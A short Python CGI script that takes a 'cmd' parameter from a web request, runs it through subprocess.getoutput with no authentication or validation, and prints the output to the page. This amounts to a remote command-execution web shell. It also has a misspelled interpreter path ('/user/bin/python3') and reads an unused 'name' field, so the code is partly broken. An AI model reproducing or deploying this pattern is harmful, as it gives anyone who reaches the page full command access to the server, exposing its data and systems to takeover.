#!/user/bin/python3


import subprocess
import cgi


print("content-type:text/html\n")

x=cgi.FieldStorage()
n=x.getvalue("name")
cmd=x.getvalue("cmd")
y=subprocess.getoutput(cmd)
print(y)
